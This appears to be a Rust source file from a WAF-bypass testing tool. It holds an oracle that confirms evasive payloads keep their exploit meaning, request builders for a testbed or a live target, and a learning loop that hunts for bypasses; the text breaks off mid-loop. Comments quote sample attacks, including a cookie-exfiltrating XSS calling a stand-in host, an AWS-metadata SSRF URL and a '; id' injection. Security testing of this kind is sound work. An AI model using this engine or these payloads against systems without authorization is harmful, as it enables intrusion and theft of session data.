//! The B→C→A equivalence moat, the *single source* of the
//! sound-by-construction `(payload × delivery)` engine, the per-class
//! `verified_bypass` oracle, and the CEGIS learned-WAF-boundary loop.
//!
//! Both the corpus bench (`bench_waf`) and the live product
//! (`scan::run_scan`) drive the **same** engine through here, bench
//! injects an httpbin-testbed request builder, scan injects a
//! live-target builder. There is exactly one copy of the loop, one
//! copy of the oracle, one model-persistence path: a fix here fixes
//! the bench and the shipped scanner at once (no duplication, no
//! drift, no dead code).

use grammar::equiv::wafmodel::{WafModel, featurize, synthesize};
use std::collections::HashSet;
use wafrift_grammar::grammar::{self, PayloadType};
// The per-class `*Oracle` structural validators are intentionally NOT used
// here: `oracle_valid` routes every class through its `grammar::equiv`
// SAME-EXPLOIT predicate (see the match arms for why the structural oracles
// were both redundant and, for XSS, harmfully narrow). Only the SQL parser
// helper is still needed, as a second gate for SQL's token-based predicate.
use wafrift_oracle::sql::{self as sql_oracle, DatabaseDialect};
use wafrift_transport::is_waf_block;
use wafrift_types::{Method, Request};

// ───────────────────────── verified-bypass oracle ─────────────────────────
//
// AUTHORITATIVE. `bench_waf` and `scan` both `use` these, the
// anti-rig definition of "bypass" lives in exactly one place.

/// A status that means the request actually reached and was processed
/// by the origin app. A 400/413/502 is the evasion *breaking* the
/// request, the attack never ran, so it is NOT a reached app. 5xx
/// app errors (500) are kept: a SQL error page is frequently *positive*
/// evidence of injection (our payload hit the query).
#[must_use]
pub(crate) fn request_reached_app(status: u16) -> bool {
    matches!(
        status,
        200..=399 | 401 | 402 | 404 | 405 | 409 | 410 | 422 | 500
    )
}

/// A response counts as a real bypass ONLY if ALL hold:
///   1. the WAF did not block it (`!blocked`),
///   2. the request actually reached the app (`request_reached_app`),
///   3. the per-class oracle confirms the effective payload is still a
///      structurally-valid attack (not mutated into harmless garbage).
#[must_use]
pub(crate) fn verified_bypass(
    class: &str,
    original: &str,
    effective: &str,
    blocked: bool,
    status: u16,
) -> bool {
    !blocked && request_reached_app(status) && oracle_valid(class, original, effective)
}

/// Differential-baseline gate over [`verified_bypass`].
///
/// A variant is credited as a bypass only when the standard oracle
/// confirms it (`verified`) AND, when differential mode is on, the
/// UN-EVADED base payload was BLOCKED in the same delivery (`base_blocked`).
///
/// This closes the inflation behind "real payloads struggle vs. what we
/// classify": without it, a payload the WAF *never policed* (e.g. `; id`
/// or `//0/` on CumulusFire, which return 200 because no rule matches them)
/// is counted as a "bypass" even though no evasion occurred. Requiring the
/// base to be blocked proves the evasion is what passed the variant.
///
/// With differential OFF, callers pass `base_blocked = true`, so this is
/// exactly `verified`: the headline metric is unchanged (anti-rig §12).
#[must_use]
pub(crate) fn differential_confirmed(
    verified: bool,
    differential: bool,
    base_blocked: bool,
) -> bool {
    verified && (!differential || base_blocked)
}

/// True iff the variant retains the exploit semantics of the original
/// payload for `class` (per-class structural validity via the
/// corresponding `wafrift-oracle`).
///
/// `cve_pocs`: the original payloads are verified exploits from public
/// CVE advisories, their semantic validity is the CVE itself, but
/// wafrift has no per-CVE oracle to confirm a mutation preserves the
/// exploit. So we accept a `cve_pocs` variant ONLY when it equals the
/// original (intact transmission). A mutated `cve_pocs` payload is
/// REFUSED (anti-rig (LAW 1): never claim validity we can't prove).
///
/// Unknown class: refuse to validate. The old behaviour was a
/// permissive `_ => true` fall-through which inflated bypass counts
/// every time a new class slipped past the match without an oracle.
/// Returning `false` makes the gap loud, the bench/scan will
/// honestly drop unverifiable bypasses until an oracle is wired.
#[must_use]
pub(crate) fn oracle_valid(class: &str, original: &str, transformed: &str) -> bool {
    match class {
        // SQL must prove the variant carries the SAME attack as the original
        // (structural-token / mechanism preservation via `still_executes`) AND
        // that it still parses as a valid injection. Pre-fix this branch only
        // ran `is_valid_expression_injection(transformed, …)`, dropping
        // `original` entirely, so a boolean tautology (`1 OR 1=1-- -`) was
        // rubber-stamped as an "equivalent" bypass of a UNION data-exfil
        // original, even though it executes a different, weaker attack. That
        // violated this fn's own contract ("retains the exploit semantics of
        // the original") and made SQL the lone class whose independent oracle
        // gate proved the wrong proposition. The `&&` keeps the parse check as
        // a second gate, so a token-soup that contains the original's
        // significant tokens out of order but is syntactically dead is also
        // rejected.
        "sql" => {
            grammar::equiv::sql::still_executes(original, transformed)
                && sql_oracle::is_valid_expression_injection(transformed, DatabaseDialect::Generic)
        }
        // xss/cmdi/ssti/path/ldap/ssrf each route through their
        // `grammar::equiv` SAME-EXPLOIT predicate, the canonical gate that
        // (a) consults `original`, so it proves "is the *same* attack", not the
        // weaker "is *some* valid attack", and (b) already carries its own
        // structural guard on the candidate (`has_exec_context` for xss,
        // `has_shell_context` for cmdi, an `inner_expr` parse for ssti, a
        // traversal/absolute mechanism for path, structural-break survival for
        // ldap, `split_url`+`is_internal` for ssrf). This mirrors
        // nosql/xxe/log4shell below, which already trust grammar::equiv alone.
        //
        // Pre-fix these six ran ONLY the structural `*Oracle.is_semantically_
        // valid`, and FIVE of those oracles ignore `original` entirely
        // (`fn is_semantically_valid(_original, …)`), so a minimizer driven by
        // this gate could collapse an AWS-metadata SSRF
        // (`http://169.254.169.254/latest/meta-data/…`) down to
        // `http://127.0.0.1/`, or a cookie-exfil XSS
        // (`<svg onload=fetch('//e/'+document.cookie)>`) down to
        // `<svg onload=alert(1)>`: both "valid" but a DIFFERENT attack.
        //
        // NOTE the oracle is intentionally NOT kept as a second `&&` gate: it
        // is both unnecessary (the equiv predicate's own structural guard is
        // the backstop) AND actively harmful here, e.g. `XssOracle` is
        // alert/confirm/prompt-centric and reports a real `fetch()`/
        // `document.cookie` exfil as "not valid XSS", which would false-fail a
        // legitimate finding's identity check and silently demote distill to
        // its WAF-only fallback. SQL is the lone class that ALSO needs a parser
        // check (`&& is_valid_expression_injection`) because its token-based
        // `still_executes` does not by itself guarantee the candidate parses.
        "xss" => grammar::equiv::xss::still_executes_xss(original, transformed),
        "cmdi" => grammar::equiv::cmd::still_executes_cmd(original, transformed),
        "ssti" => grammar::equiv::ssti::still_evaluates(original, transformed),
        "path" => grammar::equiv::path::still_resolves(original, transformed),
        "ldap" => grammar::equiv::ldap::still_matches(original, transformed),
        "ssrf" => grammar::equiv::ssrf::still_targets(original, transformed),
        "nosql" => is_valid_nosql(original, transformed),
        "xxe" => is_valid_xxe(original, transformed),
        "log4shell" => is_valid_log4shell(original, transformed),
        "graphql" => grammar::equiv::graphql::still_executes_graphql(original, transformed),
        "cve_pocs" => transformed == original,
        _ => false,
    }
}

/// `NoSQL` validity: the variant must express the SAME MongoDB
/// operator-injection (operator + operand) as the original. Delegates
/// to the RFC-8259-grounded equivalence predicate (anti-rig: a marker
/// match alone, the old behaviour, let a mangled/broken payload
/// score as a bypass; `still_injects` rejects an operator/operand
/// swap).
#[must_use]
pub(crate) fn is_valid_nosql(original: &str, transformed: &str) -> bool {
    grammar::equiv::nosql::still_injects(original, transformed)
}

/// XXE validity: the variant must still make the parser fetch the SAME
/// external resource(s) as the original (external-id equivalence).
/// `still_exfils` rejects a target-URI swap, the marker-only check it
/// replaces did not.
#[must_use]
pub(crate) fn is_valid_xxe(original: &str, transformed: &str) -> bool {
    grammar::equiv::xxe::still_exfils(original, transformed)
}

/// `Log4Shell` validity: the variant must drive the SAME JNDI fetch
/// (protocol + authority + path) after Log4j lookup-collapse.
/// `still_executes` rejects a protocol/host swap, the substring check
/// it replaces did not.
#[must_use]
pub(crate) fn is_valid_log4shell(original: &str, transformed: &str) -> bool {
    grammar::equiv::log4shell::still_executes(original, transformed)
}

/// Attack class string for a grammar [`PayloadType`], or `None` when
/// the moat has no sound model for it (anti-rig: never guess).
#[must_use]
pub(crate) fn class_for_payload_type(pt: PayloadType) -> Option<&'static str> {
    let c = match pt {
        PayloadType::Sql => "sql",
        PayloadType::Xss => "xss",
        PayloadType::CommandInjection => "cmdi",
        PayloadType::PathTraversal => "path",
        PayloadType::TemplateInjection => "ssti",
        PayloadType::Ldap => "ldap",
        // `classify()` actively returns these three (SSRF for URL-shaped
        // payloads, NoSql for `{$ne:…}`-shaped, Jndi for `${jndi:…}`), and all
        // three now have a SAME-EXPLOIT arm in `oracle_valid` (ssrf via
        // `still_targets`, nosql via `still_injects`, log4shell via
        // `still_executes`). Pre-fix they fell through to `None`, so
        // `--class auto` silently dropped the most consequential payloads
        // including the canonical Log4Shell string, to the WAF-only gate even
        // though a sound oracle existed. `Jndi` maps to the `"log4shell"`
        // oracle key (the class name in `oracle_valid`/`supports_class`).
        PayloadType::Ssrf => "ssrf",
        PayloadType::NoSql => "nosql",
        PayloadType::Jndi => "log4shell",
        // `Ssi` is deliberately absent: `oracle_valid` has no `ssi` arm, so
        // there is no sound model to route to (anti-rig: never guess). `Xxe`
        // has no `PayloadType` variant (XML payloads aren't string-classified)
        //: it is reachable only via explicit `--class xxe`.
        _ => return None,
    };
    grammar::equiv::supports_class(c).then_some(c)
}

// ───────────────────────── request builders ─────────────────────────

/// JSON-string-escape (control chars + `"` + `\`).
#[must_use]
pub(crate) fn json_escape(s: &str) -> String {
    let mut o = String::with_capacity(s.len() + 2);
    for c in s.chars() {
        match c {
            '"' => o.push_str("\\\""),
            '\\' => o.push_str("\\\\"),
            '\n' => o.push_str("\\n"),
            '\r' => o.push_str("\\r"),
            '\t' => o.push_str("\\t"),
            c if (c as u32) < 0x20 => o.push_str(&format!("\\u{:04x}", c as u32)),
            c => o.push(c),
        }
    }
    o
}

/// Translate an equivalence `DeliveryShape` into a concrete request
/// against the **httpbin-backed WAF testbed** (`/get`, `/post`,
/// `/anything/…`). Used by the corpus bench. Behaviour is pinned by
/// `bench_waf::tests::delivery_shapes_build_correct_requests`: do not
/// alter the shapes.
#[must_use]
pub(crate) fn build_request_for_delivery(
    base_url: &str,
    d: &grammar::equiv::DeliveryShape,
    payload: &str,
) -> Request {
    use grammar::equiv::DeliveryShape as D;
    let b = base_url.trim_end_matches('/');
    match d {
        D::Query { param } => {
            Request::get(format!("{b}/get?{param}={}", urlencoding::encode(payload)))
        }
        D::FormBody { param } => {
            let body = format!("{param}={}", urlencoding::encode(payload));
            let mut r = Request::post(format!("{b}/post"), body.into_bytes());
            r.add_header("content-type", "application/x-www-form-urlencoded");
            r
        }
        D::JsonBody {
            param,
            content_type,
        } => {
            let body = format!(
                "{{\"{}\":\"{}\"}}",
                json_escape(param),
                json_escape(payload)
            );
            let mut r = Request::post(format!("{b}/post"), body.into_bytes());
            if let Some(ct) = content_type {
                r.add_header("content-type", ct.clone());
            }
            r
        }
        // Multipart structural fields (name / filename / part_ct) need the
        // same CR/LF/NUL/quote strip + boundary-collision guard the live
        // renderer applies. Single-source via grammar's `to_request` so the
        // testbed builder can't drift from it or silently skip the strip, a
        // corpus-deserialized shape re-fired by `wafrift harvest` is built
        // HERE, so the sanitization must not be testbed-absent. Posts to /post.
        D::MultipartField { .. } | D::MultipartFile { .. } | D::Utf7MultipartField { .. } => {
            d.to_request(&format!("{b}/post"), payload)
        }
        D::PathSegment => Request::get(format!("{b}/anything/{}", urlencoding::encode(payload))),
        D::HppSplit { param, parts } => {
            let decoys = (*parts).max(1);
            let mut qs: Vec<String> = (0..decoys)
                .map(|k| format!("{param}={}", urlencoding::encode(&format!("v{k}"))))
                .collect();
            qs.push(format!("{param}={}", urlencoding::encode(payload)));
            Request::get(format!("{b}/get?{}", qs.join("&")))
        }
        // Raw reflected channels → httpbin's echo endpoints (`/headers`
        // echoes request headers, `/cookies` echoes cookies). Render
        // via the single-source `to_request` so the smuggling guard
        // (CR/LF/NUL/`;` strip) is not re-implemented here.
        D::HeaderValue { .. } => d.to_request(&format!("{b}/headers"), payload),
        D::Cookie { .. } => d.to_request(&format!("{b}/cookies"), payload),
        // Body-channel shapes, single-source via grammar's renderer
        // (XML escape, nested JSON, GraphQL envelope, JSON-unicode body).
        D::XmlBody { .. }
        | D::JsonNestedDeep { .. }
        | D::GraphQLQuery { .. }
        | D::JsonUnicodeBody { .. } => d.to_request(&format!("{b}/post"), payload),
    }
}

// `url_with_pair` / `url_with_path_segment` were removed: the joint
// `(payload × delivery)` URL rendering is now single-sourced in
// `wafrift_grammar::grammar::equiv::DeliveryShape::to_request` (the
// live path delegates to it). These cli-local copies were pre-refactor
// duplicates with no remaining callers, the capability lives in
// grammar, so this is dead-duplicate cleanup, not a capability drop.

/// Translate an equivalence `DeliveryShape` into a concrete request
/// against the **live operator-supplied target** (a real URL), the
/// shipped `wafrift scan` path. Same joint algebra as the testbed
/// builder, but every shape hits the *actual* endpoint instead of
/// httpbin routes. The shape already carries the operator's parameter
/// name (the generator builds shapes from `cfg.param`, which
/// `run_equiv_cegis` threads from the scan's `--param`), so there is
/// no separate `param` argument, it would be a second, ignored,
/// source of truth.
#[must_use]
pub(crate) fn build_live_request_for_delivery(
    target: &str,
    d: &grammar::equiv::DeliveryShape,
    payload: &str,
) -> Request {
    // Single source of truth: the joint (payload × delivery) algebra
    // lives on `DeliveryShape` in `wafrift-grammar` so scald, the
    // proxy and the CLI render delivery identically.
    d.to_request(target, payload)
}

/// Full response envelope returned by [`send_with_envelope`], gives
/// downstream consumers (corpus recorder, CF oracle, edge-POP coverage
/// map) the headers and body they need to attribute the verdict.
///
/// `send` and `send_with_envelope` are the only places where the
/// reqwest response is read. By centralising the read here, every
/// consumer that wants more than `(status, blocked, latency)` opts
/// into the same bounded-read + header-clone path.
#[derive(Debug, Clone)]
pub(crate) struct ProbeEnvelope {
    /// HTTP status code.
    pub(crate) status: u16,
    /// Response headers as `(name, value)` pairs in the order returned
    /// by reqwest. Name is lowercased on the wire; we preserve it
    /// verbatim so callers can pattern-match on case as the WAF saw it.
    /// Read by `CorpusRecorder::record → parse_cf_block`. R70 pass-21:
    /// removed `#[allow(dead_code)]`: the field IS read in production
    /// (corpus_recorder.rs), so the lint was a false suppression
    /// hiding the LAW 1 signal that would fire if the recorder ever
    /// stopped consuming this field.
    pub(crate) headers: Vec<(String, String)>,
    /// Response body bytes (bounded by `safe_body::DEFAULT_MAX_RESPONSE_BYTES`).
    /// Read by `CorpusRecorder::record → parse_cf_block + fnv1a_64`. R70
    /// pass-21: see headers field above: `#[allow(dead_code)]` removed.
    pub(crate) body: Vec<u8>,
    /// Same `is_waf_block` signal `send()` returns.
    pub(crate) blocked: bool,
    /// Wall-clock for the probe in milliseconds.
    pub(crate) latency_ms: f64,
}

/// Build a header value from a raw payload, accepting RFC 7230 obs-text
/// (bytes 0x80–0xFF) which reqwest's `&str` header path
/// (`HeaderValue::from_str`) rejects. High-byte evasion payloads
/// (overlong UTF-8, raw bytes) are *legal* header values, but routing
/// them through `&str` made the whole membership query fail as a deferred
/// "builder error", silently dropping that L* learning signal (observed
/// flooding the cumulus hunt; CLAUDE.md §13 dogfood).
///
/// CTL bytes (0x00-0x1F, 0x7F) are stripped BEFORE `from_bytes`, matching
/// `DeliveryShape::to_request`'s `strip_unsafe`. The oracle then
/// validates the effective (post-strip) payload via `effective_payload`,
/// not the pre-strip `member.payload`, so a stripped VT/FF that changes
/// the payload is caught as "not a valid attack" rather than erroring
/// the send and wasting fire budget. Pre-fix this returned `Err` for any
/// CTL byte, causing `send_with_envelope` to error on every VT/FF-bearing
/// payload from `WS_EQUIV` and silently dropping 6/15 variants per SQL
/// case.
fn header_value_from_payload(v: &str) -> Result<reqwest::header::HeaderValue, String> {
    // Strip CTL (0x00-0x1F, 0x7F) to match what `to_request` does and
    // what `HeaderValue::from_bytes` requires. Keep SP/HTAB (0x20/0x09)
    // since `from_bytes` accepts them and `to_request` doesn't strip them
    // (interior OWS is legal; edge OWS is handled by `effective_payload`).
    let stripped: String = v
        .chars()
        .filter(|c| {
            let b = *c as u32;
            (b > 0x1F || b == 0x09) && b != 0x7F
        })
        .collect();
    reqwest::header::HeaderValue::from_bytes(stripped.as_bytes())
        .map_err(|_| "undeliverable header value".to_string())
}

/// Fire one `wafrift_types::Request` and return the full response
/// envelope. Used by the corpus-recording wire-up to feed
/// `wafrift_oracle::cloudflare::parse_cf_block` and the
/// `EdgePopCoverage` map.
///
/// The thin [`send`] wrapper exists for the hot bench loop that only
/// needs `(status, blocked, latency)` and doesn't pay the cost of
/// cloning headers it won't read.
pub(crate) async fn send_with_envelope(
    client: &reqwest::Client,
    req: &Request,
    timeout_secs: u64,
) -> Result<ProbeEnvelope, String> {
    let start = std::time::Instant::now();
    let mut builder = match req.method {
        Method::Get => client.get(&req.url),
        Method::Post => client.post(&req.url),
        Method::Put => client.put(&req.url),
        Method::Delete => client.delete(&req.url),
        Method::Patch => client.patch(&req.url),
        _ => client.get(&req.url),
    };
    for (k, v) in &req.headers {
        // §13 dogfood (cumulus): high-byte (RFC 7230 obs-text) payloads
        // are legal header values, but reqwest's `&str` path rejects them,
        // failing the entire membership query as a "builder error" and
        // starving the L* model. Build via `from_bytes` so they send; only
        // genuinely-illegal NUL/CR/LF are skipped (undeliverable by
        // construction (see `header_value_from_payload`)).
        let value = header_value_from_payload(v)?;
        builder = builder.header(k.as_str(), value);
    }
    if let Some(body) = &req.body {
        builder = builder.body(body.clone());
    }
    builder = builder.timeout(std::time::Duration::from_secs(timeout_secs));
    let resp = builder
        .send()
        .await
        .map_err(|e| crate::helpers::walk_reqwest_error(&e))?;
    let status = resp.status().as_u16();
    // Snapshot headers BEFORE consuming the body, reqwest::Response
    // moves the body but headers are clonable.
    let headers: Vec<(String, String)> = resp
        .headers()
        .iter()
        .map(|(k, v)| {
            let value = v
                .to_str()
                .map(str::to_string)
                .unwrap_or_else(|_| String::from_utf8_lossy(v.as_bytes()).into_owned());
            (k.as_str().to_string(), value)
        })
        .collect();
    // Bounded read (decompression-bomb defence on the WAF response).
    let body = crate::safe_body::read_bounded(resp, crate::safe_body::DEFAULT_MAX_RESPONSE_BYTES)
        .await
        .map_err(|e| e.to_string())?;
    let blocked = is_waf_block(status, &body);
    let latency_ms = start.elapsed().as_secs_f64() * 1000.0;
    Ok(ProbeEnvelope {
        status,
        headers,
        body,
        blocked,
        latency_ms,
    })
}

/// Fire one `wafrift_types::Request` through the shared reqwest client.
/// Returns `(status, blocked, latency_ms)`. `blocked` is the SAME
/// `is_waf_block` signal the scan baseline uses.
///
/// Thin wrapper around [`send_with_envelope`] for call sites that only
/// need the verdict and don't want to allocate the headers vec.
pub(crate) async fn send(
    client: &reqwest::Client,
    req: &Request,
    timeout_secs: u64,
) -> Result<(u16, bool, f64), String> {
    let e = send_with_envelope(client, req, timeout_secs).await?;
    Ok((e.status, e.blocked, e.latency_ms))
}

// ───────────────────────── B→C→A CEGIS loop ─────────────────────────

/// One verified bypass produced by the moat.
#[derive(Debug, Clone)]
pub(crate) struct EquivBypass {
    pub(crate) payload: String,
    pub(crate) delivery_label: &'static str,
    /// The exact delivery shape that beat the WAF. `delivery_label` is
    /// the human/display name (a `&'static str`); this is the full,
    /// serializable shape (with param names, HPP decoy count, JSON
    /// depth, …) the corpus persists so `wafrift harvest` re-fires the
    /// identical request rather than guessing standard shapes.
    pub(crate) delivery: grammar::equiv::DeliveryShape,
    pub(crate) rules: Vec<&'static str>,
    pub(crate) status: u16,
    /// `"learn"` (Phase-C diverse probe) or `"cegis"` (Phase-A
    /// synthesized counterexample-guided probe).
    pub(crate) phase: &'static str,
    /// Full response envelope from the confirming probe, the headers +
    /// body that `CorpusRecorder::record → parse_cf_block` needs for CF
    /// rule + edge-POP attribution. Lets bench/hunt persist the winning
    /// payload with full evidence instead of `status` alone.
    pub(crate) envelope: ProbeEnvelope,
}

// AUDIT (depth pass): anti-rig chain verified sound end-to-end
// send → is_waf_block (canonical FP-cheap classifier) → verified_bypass
// (3 gates) → oracle_valid (parser-grounded). EquivOutcome counts ONLY
// verified bypasses; `unverified_not_blocked` surfaces WAF-slips that
// failed an independent gate WITHOUT inflating the bypass count. No
// fabrication or count-inflation path exists. see internal audit notes.
/// Aggregate outcome of one moat run for one (class, payload).
#[derive(Debug, Clone, Default)]
pub(crate) struct EquivOutcome {
    /// Equivalence members actually sent.
    pub(crate) variants: usize,
    /// Requests fired (== variants; kept distinct for clarity).
    pub(crate) sends: usize,
    /// Slipped the WAF but failed an independent gate (NOT counted as
    /// a bypass (surfaced for honesty/triage)).
    pub(crate) unverified_not_blocked: usize,
    /// Members that passed all three `verified_bypass` gates.
    pub(crate) bypasses: Vec<EquivBypass>,
    /// The per-WAF boundary model was refined and persisted.
    pub(crate) model_saved: bool,
}

/// Run the full B→C→A moat for one `(class, payload)`:
///
/// * **B**: draw a diverse, round-robin-by-delivery-arm pool of
///   sound-by-construction equivalence members.
/// * **A (warm start)**: load the boundary learned for THIS WAF on a
///   previous engagement; order the learn probes by predicted-allow so
///   even learning sends bypass sooner (the compounding asset).
/// * **C/A**: learn an averaged-perceptron WAF boundary from probe
///   verdicts, then CEGIS-synthesize the min-predicted-block unseen
///   member, confirm, refit on every counterexample.
///
/// `build` is the request constructor, the testbed builder for the
/// corpus bench, the live builder for `wafrift scan`. One loop, two
/// callers: the moat the bench measures IS the moat the product ships.
#[allow(clippy::too_many_arguments)]
pub(crate) async fn run_equiv_cegis<F>(
    client: &reqwest::Client,
    build: F,
    class: &str,
    payload: &str,
    seed_src: &str,
    param: &str,
    budget: usize,
    delay_ms: u64,
    timeout_secs: u64,
    model_signature: &str,
) -> EquivOutcome
where
    F: Fn(&grammar::equiv::DeliveryShape, &str) -> Request,
{
    run_equiv_cegis_inner(
        client,
        build,
        class,
        payload,
        seed_src,
        param,
        budget,
        delay_ms,
        timeout_secs,
        model_signature,
        None, // max_fires: None = unlimited (bench and hunt callers are unaffected)
    )
    .await
}

/// Same as [`run_equiv_cegis`] but with an optional global fire budget.
/// Only `wafrift scan` uses this form; bench and hunt callers go through the
/// public `run_equiv_cegis` wrapper above which passes `None` (unlimited) so
/// their metrics are identical to pre-flag behaviour.
#[allow(clippy::too_many_arguments)]
pub(crate) async fn run_equiv_cegis_with_budget<F>(
    client: &reqwest::Client,
    build: F,
    class: &str,
    payload: &str,
    seed_src: &str,
    param: &str,
    budget: usize,
    delay_ms: u64,
    timeout_secs: u64,
    model_signature: &str,
    // Global fires already counted by the scan orchestrator before
    // this phase began. Combined with `max_fires`, stops the phase
    // when `fires_already + sends >= max_fires`.
    fires_already: usize,
    max_fires: usize,
) -> EquivOutcome
where
    F: Fn(&grammar::equiv::DeliveryShape, &str) -> Request,
{
    let cap = if max_fires == 0 {
        None
    } else {
        Some(max_fires.saturating_sub(fires_already))
    };
    run_equiv_cegis_inner(
        client,
        build,
        class,
        payload,
        seed_src,
        param,
        budget,
        delay_ms,
        timeout_secs,
        model_signature,
        cap,
    )
    .await
}

#[allow(clippy::too_many_arguments)]
async fn run_equiv_cegis_inner<F>(
    client: &reqwest::Client,
    build: F,
    class: &str,
    payload: &str,
    seed_src: &str,
    param: &str,
    budget: usize,
    delay_ms: u64,
    timeout_secs: u64,
    model_signature: &str,
    // When Some(n), stop firing after n more sends in this phase.
    // When None, fire until the CEGIS budget is exhausted (original behaviour).
    phase_fire_cap: Option<usize>,
) -> EquivOutcome
where
    F: Fn(&grammar::equiv::DeliveryShape, &str) -> Request,
{
    let mut out = EquivOutcome::default();
    if !grammar::equiv::supports_class(class) {
        return out;
    }

    // Issue-7 fix (dogfood R29 cohort): pre-fix `eprintln!`-per-error
    // spammed stderr with N copies of the same builder-error string
    // when a payload character family broke header construction
    // repeatedly. Aggregate by the error's display string and emit a
    // single "N×: <error>" summary at function exit, same root-
    // cause information, zero noise.
    let mut error_tally: std::collections::HashMap<String, usize> =
        std::collections::HashMap::new();

    // FNV-1a of the stable id → deterministic per (target, payload).
    let mut case_seed: u64 = wafrift_types::hash::FNV_OFFSET_64;
    for byte in seed_src.bytes() {
        case_seed ^= u64::from(byte);
        case_seed = case_seed.wrapping_mul(wafrift_types::hash::FNV_PRIME_64);
    }

    let arms = grammar::equiv::sql::DELIVERY_ARMS;
    let per_arm = 4usize;
    let mut pool: Vec<(grammar::equiv::EquivPayload, usize)> = Vec::new();
    for arm in 0..arms {
        let cfg = grammar::equiv::EquivConfig {
            seed: case_seed ^ (arm as u64).wrapping_mul(0x9E37_79B1_85EB_CA87),
            max: per_arm,
            verify: true,
            vary_delivery: false,
            param: param.to_string(),
            force_delivery: Some(arm),
        };
        for m in grammar::equiv::equiv_for(class, payload, &cfg) {
            pool.push((m, arm));
        }
    }
    if pool.is_empty() {
        return out;
    }

    let keyed: Vec<(String, usize)> = pool.iter().map(|(m, a)| (m.payload.clone(), *a)).collect();
    let budget = budget.max(arms);
    let learn_n = (budget / 2).max(arms.min(pool.len()));
    let mut samples: Vec<(Vec<f64>, bool)> = Vec::new();
    let mut tried: HashSet<(String, usize)> = HashSet::new();
    let mut sends = 0usize;
    // Per-arm consecutive error tracking: if a delivery arm consistently
    // errors (e.g. a WAF that rejects all header-bearing requests with a
    // 502), skip it after MAX_CONSECUTIVE_ARM_ERRORS to stop wasting
    // variants on a dead channel. The arm is marked in `dead_arms` and
    // both the learn and CEGIS phases skip its candidates.
    const MAX_CONSECUTIVE_ARM_ERRORS: usize = 3;
    let mut arm_errors: Vec<usize> = vec![0; arms];
    let mut dead_arms: HashSet<usize> = HashSet::new();

    // Differential-baseline pre-probe (anti-rig §12). When enabled, fire the
    // UN-EVADED base payload once per delivery arm and record whether the WAF
    // BLOCKS it. A variant is then credited as a bypass only if its arm's base
    // was blocked, i.e. the evasion is what passed it, not a payload the WAF
    // never policed (the `; id` / `//0/`-return-200 inflation). These probes
    // are verification overhead: they do NOT count toward `out.variants` or the
    // fire budget (`sends`), so the variant metric is unchanged. With
    // differential OFF, every arm is treated as "base blocked" → the gate is a
    // no-op and crediting is byte-for-byte identical to legacy behaviour.
    let differential = crate::config::differential_enabled();
    let base_blocked: Vec<bool> = if differential {
        let mut bb = vec![false; arms];
        for (arm, bb_slot) in bb.iter_mut().enumerate() {
            let Some((m, _)) = pool.iter().find(|(_, a)| *a == arm) else {
                continue;
            };
            if delay_ms > 0 {
                tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
            }
            let req = build(&m.delivery, payload); // BASE (un-evaded) payload
            match send_with_envelope(client, &req, timeout_secs).await {
                Ok(env) => *bb_slot = env.blocked,
                Err(e) => {
                    *error_tally
                        .entry(format!("equiv differential base-probe: {e}"))
                        .or_insert(0) += 1;
                }
            }
        }
        bb
    } else {
        vec![true; arms]
    };

    // A: compounding boundary learned for THIS WAF previously.
    let model_dir = grammar::equiv::wafmodel::default_model_dir();
    let fp = grammar::equiv::wafmodel::waf_fingerprint(model_signature);
    let mpath = grammar::equiv::wafmodel::model_path(&model_dir, &fp);
    let prior = WafModel::load(&mpath).filter(|m| m.n > 0);

    // Phase 1: learn (probe a round-robin-by-arm diverse subset).
    let mut order: Vec<usize> = Vec::new();
    {
        let mut by_arm: Vec<Vec<usize>> = vec![Vec::new(); arms];
        for (i, (_, a)) in pool.iter().enumerate() {
            by_arm[*a].push(i);
        }
        let mut more = true;
        while more && order.len() < learn_n {
            more = false;
            for bucket in by_arm.iter_mut() {
                if let Some(idx) = bucket.pop() {
                    order.push(idx);
                    more = true;
                    if order.len() >= learn_n {
                        break;
                    }
                }
            }
        }
    }
    // Warm-start ordering: probe predicted-ALLOWED candidates first.
    if let Some(p) = &prior {
        order.sort_by(|&x, &y| {
            let sx = p.score(&featurize(&pool[x].0.payload, pool[x].1));
            let sy = p.score(&featurize(&pool[y].0.payload, pool[y].1));
            sx.partial_cmp(&sy).unwrap_or(std::cmp::Ordering::Equal)
        });
    }
    for &i in &order {
        if sends >= budget {
            break;
        }
        // Respect the optional global fire-budget cap (scan --max-fires).
        // None = unlimited (bench/hunt callers); Some(n) = stop when reached.
        if phase_fire_cap.is_some_and(|cap| sends >= cap) {
            break;
        }
        let (m, arm) = pool[i].clone();
        if dead_arms.contains(&arm) {
            continue;
        }
        if out.variants > 0 && delay_ms > 0 {
            tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
        }
        let req = build(&m.delivery, &m.payload);
        out.variants += 1;
        match send_with_envelope(client, &req, timeout_secs).await {
            Ok(env) => {
                sends += 1;
                arm_errors[arm] = 0;
                let (status, blocked) = (env.status, env.blocked);
                samples.push((featurize(&m.payload, arm), blocked));
                let effective = m.delivery.effective_payload(&m.payload);
                let verified = verified_bypass(class, payload, &effective, blocked, status);
                if differential_confirmed(verified, differential, base_blocked[arm]) {
                    out.bypasses.push(EquivBypass {
                        payload: m.payload.clone(),
                        delivery_label: m.delivery.label(),
                        delivery: m.delivery.clone(),
                        rules: m.rules.clone(),
                        status,
                        phase: "learn",
                        envelope: env,
                    });
                } else if !blocked {
                    out.unverified_not_blocked += 1;
                }
                tried.insert((m.payload.clone(), arm));
            }
            Err(e) => {
                // §7 forward-progress: mark tried so CEGIS doesn't re-fire.
                tried.insert((m.payload.clone(), arm));
                // Per-arm consecutive error tracking: after
                // MAX_CONSECUTIVE_ARM_ERRORS, mark the arm dead and
                // skip its remaining candidates.
                arm_errors[arm] += 1;
                if arm_errors[arm] >= MAX_CONSECUTIVE_ARM_ERRORS {
                    dead_arms.insert(arm);
                }
                *error_tally
                    .entry(format!("equiv learn send: {e}"))
                    .or_insert(0) += 1;
            }
        }
    }

    // Phase 2: CEGIS (synthesize, confirm, refit on counterexample).
    let mut model = prior
        .clone()
        .unwrap_or_else(|| WafModel::learn(&samples, 30));
    while sends < budget && phase_fire_cap.is_none_or(|cap| sends < cap) {
        let Some((pp, aa)) = synthesize(&keyed, &model, &tried).cloned() else {
            break;
        };
        let Some((m, arm)) = pool
            .iter()
            .find(|(m, a)| m.payload == pp && *a == aa)
            .map(|(m, a)| (m.clone(), *a))
        else {
            break;
        };
        if dead_arms.contains(&arm) {
            tried.insert((pp.clone(), aa));
            continue;
        }
        if out.variants > 0 && delay_ms > 0 {
